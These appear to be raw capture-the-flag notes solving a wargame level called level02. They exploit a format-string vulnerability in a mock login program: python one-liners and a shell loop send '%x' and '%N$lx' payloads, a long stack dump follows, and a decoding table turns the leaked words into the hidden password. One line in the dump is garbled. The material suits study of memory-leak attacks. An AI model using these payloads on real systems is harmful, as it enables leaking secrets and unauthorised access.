(python -c "print '\xff\xff\xff\xff' + '%x '*20 + '\n' + 'BBBB\n'") | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe500 0 42 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 42424242 0 0 0 0 0 0 0 0 0 0 0 0  does not have access!

0x7fffffffe540 buffer fread


<pre>
#!/bin/sh
IDX=0
while [ $IDX -lt 361 ]
do
echo $IDX >> /tmp/hexmap
(python -c "print '%$IDX\$lx ' + '\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  + '\n'") | ~/level02 | grep "access!" >> /tmp/hexmap   
IDX=$((IDX+1))
echo $IDX
done
</pre>


cat hexmap
<pre>
%0$lx  does not have access!
7fffffffe4f0  does not have access!
0  does not have access!
0  does not have access!
2a2a2a2a2a2a2a2a  does not have access!
2a2a2a2a2a2a2a2a  does not have access!
7fffffffe6e8  does not have access!
1f7ff9a08  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
100000000  does not have access!
0  does not have access!
756e505234376848  does not have access!
45414a3561733951  does not have access!
377a7143574e6758  does not have access!
354a35686e475873  does not have access!
48336750664b394d  does not have access!
0  does not have access!
20786c24383225  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
0  does not have access!
2900000000  does not have access!
602010  does not have access!
0  does not have access!
7ffff7a3d7ed  does not have access!
0  does not have access!
7fffffffe6e8  does not have access!
100000000  does not have access!
400814  does not have access!
0  does not have access!
2471aa8d216245f9  does not have access!
400730  does not have access!
7fffffffe6e0  does not have access!
0  does not have access!
0  does not have access!
bff1e42ac568ba9  does not have access!
9afd98a735b93f97  does not have access!
7fff00000000  does not have access!
0  does not have access!
0  does not have access!
400ac0  does not have access!
7fffffffe6e8  does not have access!
1  does not have access!
0  does not have access!
0  does not have access!
400730  does not have access!
7fffffffe6e0  does not have access!
0  does not have access!
400759  does not have access!
7fffffffe6d8  does not have access!
1c  does not have access!
1  does not have access!
7fffffffe8e2  does not have access!
0  does not have access!
7fffffffe8fe  does not have access!
7fffffffe91e  does not have access!
7fffffffe935  does not have access!
7fffffffe958  does not have access!
7fffffffe965  does not have access!
7fffffffe977  does not have access!
7fffffffe97f  does not have access!
7fffffffe998  does not have access!
7fffffffe9b3  does not have access!
7fffffffe9c6  does not have access!
7fffffffe9d6  does not have access!
7fffffffe9e2  does not have access!
7fffffffe9ee  does not have access!
7fffffffea3b  does not have access!
7fffffffea4c  does not have access!
7fffffffef6d  does not have access!
7fffffffef7d  does not have access!
7fffffffef9f  does not have access!
7fffffffefa8  does not have access!
0  does not have access!
21  does not have access!
7ffff7ffa000  does not have access!
10  does not have access!
178bfbff  does not have access!
6  does not have access!
1000  does not have access!
11  does not have access!
64  does not have access!
3  does not have access!
400040  does not have access!
4  does not have access!
38  does not have access!
5  does not have access!
8  does not have access!
7  does not have access!
7ffff7dda000  does not have access!
8  does not have access!
0  does not have access!
9  does not have access!
400730  does not have access!
b  does not have access!
3ea  does not have access!
c  does not have access!
3eb  does not have access!
d  does not have access!
3ea  does not have access!
e  does not have access!
64  does not have access!
17  does not have access!
1  does not have access!
19  does not have access!
7fffffffe8c9  does not have access!
1f  does not have access!
7fffffffefdc  does not have access!
f  does not have access!
7fffffffe8d9  does not have access!
0  does not have access!
0  does not have access!
a86e58e277be8900  does not have access!
a69100d07d66c10a  does not have access!
34365f363878f7  does not have access!
2f656d6f682f0000  does not have access!
656c2f7372657375  does not have access!
656c2f32306c6576  does not have access!
454c0032306c6576  does not have access!
7c3d4e45504f5353  does not have access!
69622f7273752f20  does not have access!
69707373656c2f6e  does not have access!
414d007325206570  does not have access!
2f7261762f3d4c49  does not have access!
76656c2f6c69616d  does not have access!
4853530032306c65  does not have access!
3d544e45494c435f  does not have access!
2e3836312e323931  does not have access!
3234352039322e30  does not have access!
32343234203130  does not have access!
76656c3d52455355  does not have access!
4e414c0032306c65  does not have access!
6e653d4547415547  does not have access!
53006e653a53555f  does not have access!
4800313d4c564c48  does not have access!
6d6f682f3d454d4f  does not have access!
2f73726573752f65  does not have access!
32306c6576656c  does not have access!
2f3d445750444c4f  does not have access!
6573752f656d6f68  does not have access!
6c6576656c2f7372  does not have access!
545f485353003230  does not have access!
2f7665642f3d5954  does not have access!
4f4c00312f737470  does not have access!
656c3d454d414e47  does not have access!
3d5f0032306c6576  does not have access!
732e747365742f2e  does not have access!
633d4d5245540068  does not have access!
4150006e69776779  does not have access!
2f7273752f3d4854  does not have access!
62732f6c61636f6c  does not have access!
2f7273752f3a6e69  does not have access!
69622f6c61636f6c  does not have access!
732f7273752f3a6e  does not have access!
7273752f3a6e6962  does not have access!
62732f3a6e69622f  does not have access!
3a6e69622f3a6e69  does not have access!
6d61672f7273752f  does not have access!
3d474e414c007365  does not have access!
54552e53555f6e65  does not have access!
435f534c00382d46  does not have access!
73723d53524f4c4f  does not have access!
31303d69643a303d  does not have access!
303d6e6c3a34333b  does not have access!
3d686d3a36333b31  does not have access!
30343d69703a3030  does not have access!
303d6f733a33333b  does not have access!
3d6f643a35333b31  does not have access!
64623a35333b3130  does not have access!
303b33333b30343d  does not have access!
3b30343d64633a31  does not have access!
726f3a31303b3333  does not have access!
303b31333b30343d  does not have access!
3b37333d75733a31  does not have access!
30333d67733a3134  does not have access!
333d61633a33343b  does not have access!
3d77743a31343b30  does not have access!
776f3a32343b3033  does not have access!
733a32343b34333d  does not have access!
3a34343b37333d74  does not have access!
32333b31303d7865  does not have access!
303d7261742e2a3a  does not have access!
742e2a3a31333b31  does not have access!
31333b31303d7a67  does not have access!
303d6a72612e2a3a  does not have access!
742e2a3a31333b31  does not have access!
31333b31303d7a61  does not have access!
303d687a6c2e2a3a  does not have access!
6c2e2a3a31333b31  does not have access!
333b31303d616d7a  does not have access!
3d7a6c742e2a3a31  does not have access!
2e2a3a31333b3130  does not have access!
333b31303d7a7874  does not have access!
3d70697a2e2a3a31  does not have access!
2e2a3a31333b3130  does not have access!
3a31333b31303d7a  does not have access!
333b31303d5a2e2a  does not have access!
303d7a642e2a3a31  does not have access!
672e2a3a31333b31  does not have access!
3a31333b31303d7a  does not have access!
3b31303d7a6c2e2a  does not have access!
3d7a782e2a3a3133  does not have access!
2e2a3a31333b3130  does not have access!
333b31303d327a62  does not have access!
303d7a622e2a3a31  does not have access!
742e2a3a31333b31  does not have access!
31333b31303d7a62  does not have access!
3d327a62742e2a3a  does not have access!
2e2a3a31333b3130  does not have access!
31333b31303d7a74  does not have access!
303d6265642e2a3a  does not have access!
722e2a3a31333b31  does not have access!
31333b31303d6d70  does not have access!
303d72616a2e2a3a  does not have access!
772e2a3a31333b31  does not have access!
31333b31303d7261  does not have access!
303d7261652e2a3a  does not have access!
732e2a3a31333b31  does not have access!
31333b31303d7261  does not have access!
303d7261722e2a3a  does not have access!
612e2a3a31333b31  does not have access!
31333b31303d6563  does not have access!
303d6f6f7a2e2a3a  does not have access!
632e2a3a31333b31  does not have access!
333b31303d6f6970  does not have access!
303d7a372e2a3a31  does not have access!
722e2a3a31333b31  does not have access!
3a31333b31303d7a  does not have access!
31303d67706a2e2a  does not have access!
706a2e2a3a35333b  does not have access!
35333b31303d6765  does not have access!
303d6669672e2a3a  does not have access!
622e2a3a35333b31  does not have access!
35333b31303d706d  does not have access!
303d6d62702e2a3a  does not have access!
702e2a3a35333b31  does not have access!
35333b31303d6d67  does not have access!
303d6d70702e2a3a  does not have access!
742e2a3a35333b31  does not have access!
35333b31303d6167  does not have access!
303d6d62782e2a3a  does not have access!
782e2a3a35333b31  does not have access!
35333b31303d6d70  does not have access!
303d6669742e2a3a  does not have access!
742e2a3a35333b31  does not have access!
333b31303d666669  does not have access!
3d676e702e2a3a35  does not have access!
2e2a3a35333b3130  does not have access!
333b31303d677673  does not have access!
7a6776732e2a3a35  does not have access!
2a3a35333b31303d  does not have access!
3b31303d676e6d2e  does not have access!
7863702e2a3a3533  does not have access!
2a3a35333b31303d  does not have access!
3b31303d766f6d2e  does not have access!
67706d2e2a3a3533  does not have access!
2a3a35333b31303d  does not have access!
31303d6765706d2e  does not have access!
326d2e2a3a35333b  does not have access!
3a35333b31303d76  does not have access!
31303d766b6d2e2a  does not have access!
65772e2a3a35333b  does not have access!
35333b31303d6d62  does not have access!
303d6d676f2e2a3a  does not have access!
6d2e2a3a35333b31  does not have access!
35333b31303d3470  does not have access!
303d76346d2e2a3a  does not have access!
6d2e2a3a35333b31  does not have access!
333b31303d763470  does not have access!
3d626f762e2a3a35  does not have access!
2e2a3a35333b3130  does not have access!
35333b31303d7471  does not have access!
303d76756e2e2a3a  does not have access!
772e2a3a35333b31  does not have access!
35333b31303d766d  does not have access!
303d6673612e2a3a  does not have access!
722e2a3a35333b31  does not have access!
3a35333b31303d6d  does not have access!
303d62766d722e2a  does not have access!
662e2a3a35333b31  does not have access!
35333b31303d636c  does not have access!
303d6976612e2a3a  does not have access!
662e2a3a35333b31  does not have access!
35333b31303d696c  does not have access!
303d766c662e2a3a  does not have access!
672e2a3a35333b31  does not have access!
3a35333b31303d6c  does not have access!
3b31303d6c642e2a  does not have access!
6663782e2a3a3533  does not have access!
2a3a35333b31303d  does not have access!
3b31303d6477782e  does not have access!
7675792e2a3a3533  does not have access!
2a3a35333b31303d  does not have access!
3b31303d6d67632e  does not have access!
666d652e2a3a3533  does not have access!
2a3a35333b31303d  does not have access!
3b31303d7678612e  does not have access!
786e612e2a3a3533  does not have access!
2a3a35333b31303d  does not have access!
3b31303d76676f2e  does not have access!
78676f2e2a3a3533  does not have access!
2a3a35333b31303d  does not have access!
3b30303d6361612e  does not have access!
3d75612e2a3a3633  does not have access!
2e2a3a36333b3030  does not have access!
3b30303d63616c66  does not have access!
64696d2e2a3a3633  does not have access!
2a3a36333b30303d  does not have access!
30303d6964696d2e  does not have access!
6b6d2e2a3a36333b  does not have access!
3a36333b30303d61  does not have access!
30303d33706d2e2a  does not have access!
706d2e2a3a36333b  does not have access!
3a36333b30303d63  does not have access!
30303d67676f2e2a  does not have access!
61722e2a3a36333b  does not have access!
2a3a36333b30303d  does not have access!
3b30303d7661772e  does not have access!
6178612e2a3a3633  does not have access!
2a3a36333b30303d  does not have access!
3b30303d61676f2e  does not have access!
7870732e2a3a3633  does not have access!
2a3a36333b30303d  does not have access!
30303d667073782e  does not have access!
454853003a36333b  does not have access!
2f6e69622f3d4c4c  does not have access!
53454c0068736162  does not have access!
2f3d45534f4c4353  does not have access!
2f6e69622f727375  does not have access!
657069707373656c  does not have access!
5000732520732520  does not have access!
706d742f3d4457  does not have access!
4e4e4f435f485353  does not have access!
313d4e4f49544345  does not have access!
302e3836312e3239  does not have access!
303234352039322e  does not have access!
36312e3239312031  does not have access!
342036322e302e38  does not have access!
6d6f682f00323432  does not have access!
2f73726573752f65  does not have access!
2f32306c6576656c  does not have access!
32306c6576656c  does not have access!
</p14.	.	r1.	e1.	23	5.	.	>



<pre>
	little endian	 => big endian		 => big str	 => little str		
1.	756e505234376848 => 4868373452506e75 => Hh74RPnu => unPR47hH
2.	45414a3561733951 => 51397361354a4145 => Q9sa5JAE => EAJ5as9Q
3.	377a7143574e6758 => 58674e5743717a37 => XgNWCqz7 => 7zqCWNgX
4.	354a35686e475873 => 7358476e68354a35 => sXGnh5J5 => 5J5hnGXs
5.	48336750664b394d => d4394b6650673348 => M9KfPg3H => H3gPfK9M
0 => length 40

string little		=> unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
string rev little	=> H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH

string big		=> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H => VICTORY
string rev big	=> M9KfPg3HsXGnh5J5XgNWCqz7Q9sa5JAEHh74RPnu
</pre>